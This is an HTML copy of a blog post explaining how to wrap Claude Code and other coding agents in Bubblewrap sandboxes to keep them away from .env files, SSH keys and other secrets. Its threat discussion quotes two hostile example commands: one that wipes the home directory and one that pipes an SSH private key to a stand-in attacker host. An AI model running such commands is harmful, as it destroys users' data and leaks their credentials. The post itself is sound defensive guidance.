<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://patrickmccanna.net/a-better-way-to-limit-claude-code-and-other-coding-agents-access-to-secrets/">Original</a>
    <h1>Bubblewrap: A nimble way to prevent agents from accessing your .env files</h1>
    
    <div id="readability-page-1" class="page"><article id="post-1380">
		<!-- .entry-header -->

	
	<div>
		
<p>Last week I wroteÂ <a href="https://patrickmccanna.net/keeping-secrets-from-claude-code/">a thing</a>Â about how to run Claude Code when you donâ€™t trust Claude Code. I proposed the creation of a dedicated user account &amp; standard unix access controls. The objective was to stop Claude from dancing through your .env files, eating your secrets. There are some usability problems with that guide- I found a better approach and I wanted to share.</p>



<p><strong>TL;DR:</strong>Â Use Bubblewrap to sandbox Claude Code (and other AI agents) without trusting anyoneâ€™s implementation but your own. Itâ€™s simpler than Docker and more secure than a dedicated user account.</p>



<h2>What Changed Since My Last Post</h2>



<p>Immediately after publishing, I caught the flu. During three painful days in bed, I realized there are other better approaches.Â <a href="https://wiki.archlinux.org/title/Firejail">Firejail</a>Â would likely work well- but also thereâ€™s another solution calledÂ <a href="https://wiki.archlinux.org/title/Bubblewrap">Bubblewrap</a>.</p>



<p>As I dug into Bubblewrap, I realized something elseâ€¦ <a href="https://code.claude.com/docs/en/sandboxing">Anthropic uses Bubblewrap</a>!</p>



<p>But Anthropic embeds bubblewrap in their client. This implementation has a major disadvantage.</p>



<p>Embedding bubblewrap in the client means you have to trust the correctness and security of Anthropicâ€™s implementation. They deserve credit for thinking about security, but this puzzles me. Why not publish guidance so users can secure themselves from Claude Code? Arenâ€™t we going to need this for ALL agents? Isnâ€™t this solution generalizable?</p>



<p>Defense-in-depth means we donâ€™t rely on any single vendor to execute perfectly 100% of the time. Plus, this problem applies to all coding agents, not just Claude Code. I want an approach that doesnâ€™t tie my security to Anthropicâ€™s destiny.</p>



<h2>The Security Problem Weâ€™re Solving</h2>



<p>Before we dive into Bubblewrap, hereâ€™s what weâ€™re protecting against:</p>



<ul>
<li>You want to run a binary that will execute under your accountâ€™s permissions</li>



<li>Your account has access to sensitive files unrelated to the project youâ€™re working on</li>



<li>You want your binary to invoke other standard system tools likeÂ <code>ls</code>,Â <code>ps -aux</code>, orÂ <code>less</code></li>



<li>We want to invoke this binary while easily preventing it from accessing sensitive files unrelated to binaryâ€™s activities</li>
</ul>



<p>What if Claude Code has a bug? What happens if the bug is exploited, and bubblewrap constraints embedded within the client are not activated? Will Claude Code runÂ <code>rm -rf ~</code>Â orÂ <code>cat ~/.ssh/id_rsa | curl attacker.com</code>?</p>



<p>Without your own wrapping of the agent, youâ€™re at risk. When you wrap your coding agent calls with Bubblewrap, the agentâ€™s access to dangerous commands is prevented.</p>



<h2>What Is Bubblewrap?</h2>



<p>Bubblewrap lets you run untrusted or semi-trusted code without risking your host system. Weâ€™re not trying to build a reproducible deployment artifact. Weâ€™re creating a jail where coding agents can work on your project while being unable to touchÂ Â <code>~/.aws</code>, your browser profiles, your ~/Photos library or anything else sensitive.</p>



<p>Letâ€™s explore Bubblewrap through the command line:</p>



<pre><code># Install it (Debian/Ubuntu)
sudo apt install bubblewrap

# Simplest possible sandbox - just isolate the filesystem view
bwrap --ro-bind /usr /usr --symlink usr/lib /lib --symlink usr/lib64 /lib64 \
      --symlink usr/bin /bin --proc /proc --dev /dev \
      --unshare-all --die-with-parent \
      /bin/bash

# Inside the sandbox, try:
ls /home          # Empty or nonexistent
ls /etc           # Empty or nonexistent  
whoami            # Shows &#34;nobody&#34; or your mapped user
ping google.com   # Fails - no network
</code></pre>



<h2>How This Command Works</h2>



<p>This command creates a minimal sandboxed environment. Hereâ€™s what each part does:</p>



<h3>Filesystem access:</h3>



<ul>
<li><code>--ro-bind /usr /usr</code>Â mounts your systemâ€™sÂ <code>/usr</code>Â directory as read-only inside the sandbox</li>



<li>TheÂ <code>--symlink</code>Â commands create shortcuts so programs can find libraries and binaries in expected locations</li>



<li><code>--proc /proc</code>Â andÂ <code>--dev /dev</code>Â give minimal access to system processes and devices</li>
</ul>



<h3>Isolation:</h3>



<ul>
<li><code>--unshare-all</code>Â disconnects the sandbox from all system resources (network, shared memory, mount points, etc.)</li>



<li><code>--die-with-parent</code>Â kills the sandbox if your main terminal closes</li>
</ul>



<h3>The Result:</h3>



<p>Bash runs inside a stripped-down environment. It can execute programs fromÂ <code>/usr</code>Â but canâ€™t see your home directory, config files, or access the network. Programs work, but theyâ€™re operating in a ghost town version of your filesystem.</p>



<h2>Why Bubblewrap Beats Docker</h2>



<p>This beats Docker for quick workflows. Docker requires a running daemon and lots of configuration files. Bubblewrap lets you execute your app directlyâ€”no daemon, no stale containers cluttering your system.</p>



<p>If youâ€™re experienced enough to worry about Docker misconfigurations, Bubblewrap gives you more control when you need it. You just run a command. No YAML files or debugging background services.</p>



<h2>Quick Start: Running Claude Code with Bubblewrap</h2>



<p>A big part of the reason for needing this, is â€“dangerously-skip-permissions.  There are times when itâ€™s very useful to give an agent autonomy in desiging, experimenting &amp; implementing systems.  Last week, I built a wifi access point that hosts a Quakeworld Server and vends web assembly quake clients.  Itâ€™s an instant-lan party in a box.  I did this unattended and it works.  â€“dangerously-skip-permissions is very powerful- assuming you know how to aim it safely.  </p>



<p>Hereâ€™s how I run Claude Code withÂ <code>--dangerously-skip-permissions</code>Â inside a Bubblewrap sandbox:</p>



<pre><code>PROJECT_DIR=&#34;$HOME/Development/YourProject&#34;
bwrap \
     --ro-bind /usr /usr \
     --ro-bind /lib /lib \
     --ro-bind /lib64 /lib64 \
     --ro-bind /bin /bin \
     --ro-bind /etc/resolv.conf /etc/resolv.conf \
     --ro-bind /etc/hosts /etc/hosts \
     --ro-bind /etc/ssl /etc/ssl \
     --ro-bind /etc/passwd /etc/passwd \
     --ro-bind /etc/group /etc/group \
     --ro-bind &#34;$HOME/.gitconfig&#34; &#34;$HOME/.gitconfig&#34; \
     --ro-bind &#34;$HOME/.nvm&#34; &#34;$HOME/.nvm&#34; \
     --bind &#34;$PROJECT_DIR&#34; &#34;$PROJECT_DIR&#34; \
     --bind &#34;$HOME/.claude&#34; &#34;$HOME/.claude&#34; \
     --tmpfs /tmp \
     --proc /proc \
     --dev /dev \
     --share-net \
     --unshare-pid \
     --die-with-parent \
     --chdir &#34;$PROJECT_DIR&#34; \
     --ro-bind /dev/null &#34;$PROJECT_DIR/.env&#34; \
     --ro-bind /dev/null &#34;$PROJECT_DIR/.env.local&#34; \
     --ro-bind /dev/null &#34;$PROJECT_DIR/.env.production&#34; \
     &#34;$(command -v claude)&#34; --dangerously-skip-permissions &#34;Please review Planning/ReportingEnhancementPlan.md&#34;
</code></pre>



<h3>Key Configuration Lines:</h3>



<pre><code># Required for Claude Code to work
--ro-bind &#34;$HOME/.nvm&#34; &#34;$HOME/.nvm&#34; \

# Claude stores auth here. Without this, you&#39;ll re-login every time
--bind &#34;$HOME/.claude&#34; &#34;$HOME/.claude&#34; \

# Only add if you understand why you need SSH access
# --ro-bind &#34;$HOME/.ssh&#34; &#34;$HOME/.ssh&#34; \

# Block access to your .env files by overlaying with empty files (You need to know exact path of files 

     --ro-bind /dev/null &#34;$PROJECT_DIR/.env&#34; \
     --ro-bind /dev/null &#34;$PROJECT_DIR/.env.local&#34; \
     --ro-bind /dev/null &#34;$PROJECT_DIR/.env.production&#34; \
</code></pre>



<p><strong>Important:</strong>Â Most people donâ€™t need the SSH line. It gives your agent the ability to SSH into systems where youâ€™ve copied a public key. If you donâ€™t understand the utility, donâ€™t add it.</p>



<h2>Why Not a Dedicated User Account?</h2>



<p>MyÂ <a href="https://patrickmccanna.net/keeping-secrets-from-claude-code/">previous post</a>Â proposed creating a custom user account for Claude on the host OS. This approach has three major problems:</p>



<h3>1. ACL Tuning Becomes a Usability Nightmare</h3>



<p>Youâ€™ll fight with file permissions constantly. You need to tune Access Control Lists to prevent access to sensitiveÂ <code>.env</code>Â files. This type of friction has killed security initiatives for decades. Security dies on usability hills.</p>



<p>I came up with that approach while getting sick with the flu. Please accept my apologies.</p>



<h3>2. No Network Connectivity Restrictions</h3>



<p>A custom account doesnâ€™t solve the network access problem. Claude agents can spin up sockets and connect to whatever they want. Unless you run UFW and restrict outbound connectivity from your host, you risk your agent exfiltrating content.</p>



<p>Iâ€™ve been creating agents that <a href="https://patrickmccanna.net/using-custom-ai-agents-to-migrate-self-hosted-services-between-servers/">remotely administer and tune servers</a>. Itâ€™s not responsible to let agents have source:any destination:any access to your network or the Internet. One wrong prompt puts you at risk of data exfiltration. My previous solution was incomplete.</p>



<h3>3. Docker Is the Wrong Tool</h3>



<p>Docker solves the â€œit works on my machineâ€ problem when moving code from your laptop to production servers. But most people arenâ€™t deploying frequently enough to maintain strong Docker skills.</p>



<p>Setting up filesystems and networking in containers takes mental effort. If you just want to run a command safely, you shouldnâ€™t need to install and configure a background service. People want something that works quickly without the cognitive overhead.</p>



<h2>Why Use Your Own Bubblewrap Instead of Anthropicâ€™s Sandbox?</h2>



<p><strong>Everyone makes security mistakes eventually.</strong>Â Claude Code is potentially dangerous. Which approach is safer?</p>



<p><strong>Trust Anthropic:</strong>Â Hope their team never makes an implementation mistake that breaks security controls.</p>



<p>or</p>



<p><strong>Donâ€™t Trust Anthropic:</strong>Â Implement your own access controls in the operating system that constrain the binary at runtime.</p>



<p>There is one other big reason you should know how to leverage Bubblewrap.   You need a solution for sandboxing agents that arenâ€™t Claude Code.</p>



<p><strong>Agents should never be considered trustworthy.</strong>Â Even when they have security controls. Put controls around themâ€”donâ€™t rely on agents built with models that have experiencedÂ <a href="https://www.anthropic.com/research/agentic-misalignment">misalignment</a>.</p>



<h2>A comparison of what youâ€™re trusting with user-wrapped invocation of bubblewrap versus embedded bubblewrap in a client</h2>



<h3>Running Bubblewrap Yourself:</h3>



<ul>
<li>The Linux kernelâ€™s namespace implementation</li>



<li>The Bubblewrap binary (small, auditable codebase)</li>



<li>Your own configuration (you wrote it, you understand it)</li>



<li>Your own proxy/filtering code</li>
</ul>



<h3>Using Anthropicâ€™s Sandbox Runtime:</h3>



<ul>
<li>Everything above, plus:</li>



<li>Anthropicâ€™s wrapper code and configuration choices</li>



<li>Anthropicâ€™s filtering proxy implementation</li>



<li>Anthropicâ€™s update/distribution mechanism (npm)</li>



<li>That Anthropicâ€™s security interests align with yours</li>
</ul>



<h2>The Trust Matrix</h2>



<p>Trust isnâ€™t binaryâ€”itâ€™s about understanding what youâ€™re trusting and why. Hereâ€™s a quick comparison:</p>



<figure><table><thead><tr><th data-align="left">Threat</th><th data-align="left">DIY bwrap</th><th data-align="left">Anthropic SRT</th></tr></thead><tbody><tr><td>Claude accidentallyÂ <code>rm -rf ~</code></td><td>âœ“ Protected</td><td>âœ“ Protected</td></tr><tr><td>Claude exfiltrating ~/.ssh</td><td>âœ“ Protected</td><td>âœ“ Protected</td></tr><tr><td>Supply chain attack via npm</td><td>âœ“ Not exposed</td><td>âœ— Exposed</td></tr><tr><td>Subtle misconfiguration</td><td>âœ— Your risk</td><td>âœ“ Their expertise</td></tr><tr><td>Agent Telemetry you donâ€™t want sent</td><td>âœ“ You control</td><td>? Their choice</td></tr><tr><td>Novel bypass techniques</td><td>âœ— Youâ€™re on your own</td><td>âœ“ Their team watches</td></tr></tbody></table></figure>



<p>So in Anthropicâ€™s defense: this is not cut-and-dried. Most companies donâ€™t have resources for great security teams. You have to decide whether you can own this. Many companies will be wise to rely on Anthropicâ€™s expertise. Their reputation is on the line if someone breaks their sandbox implementation. But youâ€™re going to be locked into Anthropicâ€™s security model if you donâ€™t learn how to wield bubblewrap. Pivoting to a new agent will require figuring out security there. Why not just rip the band aid off and learn bubblewrap?</p>



<h2>Donâ€™t trust me either!</h2>



<p>This has been a fun writeup on trusting trust. TRUST ME!</p>



<p>But you shouldnâ€™t trust me! I might be aÂ <a href="https://en.wikipedia.org/wiki/On_the_Internet,_nobody_knows_you%27re_a_dog">Dog on the Internet</a>. Maybe Iâ€™m ai slop?!</p>



<p>Here is some code you can use to test the bwrap container I provided for my claude usage. Note that this is invoked different- weâ€™re not going to call claude- weâ€™re going to call bash and pass it the test script.  My test script is available <a href="https://github.com/CaptainMcCrank/BlogCode/blob/main/sandbox-escape-test.sh">here</a>: </p>



<p>All you need to do is create a <strong>YourProject</strong> folder in your <strong>~/$HOME/Development</strong> directory. Then create a <strong>sandbox-escape-test.sh</strong> in there. Fill it with the test code from my github.</p>



<p><strong>Read and understand what the script does before executing it.  </strong>This post is already pretty long ğŸ˜€</p>



<h2>Wrapping Up</h2>



<p>Iâ€™m building with many agentsâ€”not just Claude Code. I need a generalized solution for sandboxing that I can apply to other agents.</p>



<p>Anthropic deserves attention and credit for the constraints theyâ€™re giving you. I wish they had published them in a way that doesnâ€™t tie your security destiny to their ability to execute correctly 100% of the time.</p>



<p>The choice is yours: trust a vendorâ€™s implementation, or take control of your own security boundaries. Both are valid. I might be paranoid. Are you feeling lucky?</p>



<p>p.s. If I ever get run over by a flaming pizza truck, hereâ€™s a handy 1 liner:</p>



<pre><code>claude &#34;Act as a security expert with a specialization in Linux system security.  Help me generate a bubblewrap script for safely invoking coding agents so they do not have access to sensitive data on my file system and appropriately manage other security risks, even though they&#39;re going to be invoked under my account&#39;s permissions.  Let&#39;s talk through everything that the agent should be able to do &amp; access first, and then generate an appropriate bwrap script for delivering that capability.  Then let&#39;s discuss what access we should restrict.&#34;</code></pre>



<p>Need help on topics related to this?  Iâ€™m currently freelance!  Letâ€™s connect and build secure things at incredibly high speed:</p>



<p><a href="https://www.linkedin.com/in/patrickmccanna">https://www.linkedin.com/in/patrickmccanna</a></p>





	</div><!-- .entry-content -->

	 <!-- .entry-footer -->
</article></div>
  </body>
</html>
